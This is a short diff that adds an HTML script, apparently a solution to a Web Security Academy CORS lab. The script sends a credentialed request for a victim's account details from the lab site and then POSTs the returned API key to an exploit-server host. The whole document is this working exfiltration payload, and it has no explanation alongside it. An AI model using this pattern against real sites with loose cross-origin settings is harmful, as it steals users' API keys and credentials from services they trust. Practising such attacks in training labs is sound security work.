@@ -1,0 +1,18 @@
+<script>
+  (async () => {
+    const res = await fetch(
+      'https://0aca00d90381bb40812cac5200ca00e6.web-security-academy.net/accountDetails',
+      { credentials: 'include' }
+    );
+
+    const data = await res.json();
+
+    await fetch(
+      'https://exploit-0a94007e03a4bb9181d4ab5601c30026.exploit-server.net/exploit',
+      {
+        method: 'POST',
+        body: data.apikey
+      }
+    );
+  })();
+</script>
